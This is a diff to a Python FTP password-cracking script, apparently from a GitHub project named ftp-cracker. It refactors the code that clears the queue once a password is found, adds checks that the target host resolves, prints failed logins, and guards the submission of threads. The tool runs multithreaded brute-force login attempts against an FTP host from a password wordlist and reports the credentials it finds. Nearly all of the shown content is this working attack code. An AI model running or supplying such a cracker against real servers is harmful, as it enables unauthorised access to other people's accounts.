@@ -3,6 +3,7 @@
 # https://github.com/AniketBhunia/ftp-cracker/blob/main/ftp_cracker.py
 
 import ftplib
+import socket
 import threading
 import queue
 from colorama import Fore, init
@@ -36,8 +37,12 @@ def connect_ftp(q,executor):
             print("Timed out: " + "password: " + password)
             pass
         except ftplib.error_perm:
-            # login failed, wrong credentials
+            print("login failed, wrong credentials")
             pass
+        except socket.gaierror as ex:
+            print(ex)
+            clear(q,executor)
+            break
         else:
             threadLock.acquire()
             # correct credentials
@@ -47,16 +52,20 @@ def connect_ftp(q,executor):
             print(f"\tPassword: {password}{Fore.RESET}")
             # we found the password, let's clear the queue
             threadLock.release()
-            with q.mutex:
-                q.queue.clear()
-                q.all_tasks_done.notify_all()
-                q.unfinished_tasks = 0
+            clear(q,executor)
         finally:
             # notify the queue that the task is completed for this password
             if q.empty() is not True:
                 q.task_done()
-            # shutdown the executor
-            executor.shutdown(wait=False,cancel_futures=True)
+
+def clear(q,executor):
+    with q.mutex:
+        q.queue.clear()
+        q.all_tasks_done.notify_all()
+        q.unfinished_tasks = 0
+    # shutdown the executor
+    executor.shutdown(wait=False,cancel_futures=True)
+
 
 if __name__ == "__main__":
     import argparse
@@ -74,6 +83,16 @@ if __name__ == "__main__":
     passlist = args.passlist
     # number of threads to spawn
     n_threads = int(args.threads)
+
+    try:
+        socket.gethostbyaddr(host)
+    except socket.gaierror:
+        print(u"Unknown host: " + host)
+        exit(1)
+    except socket.herror:
+        print(u"Unable to resolve host: " + host)
+        exit(2)
+
     # read the wordlist of passwords
     passwords = open(passlist).read().split("\n")
 
@@ -87,7 +106,8 @@ if __name__ == "__main__":
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=n_threads) as executor:
         for i in range(q.qsize()):
-            executor.submit(connect_ftp, q, executor)
+            if (q.qsize() != 0):
+                executor.submit(connect_ftp, q, executor)
 
     # wait for the queue to be empty
     q.join()
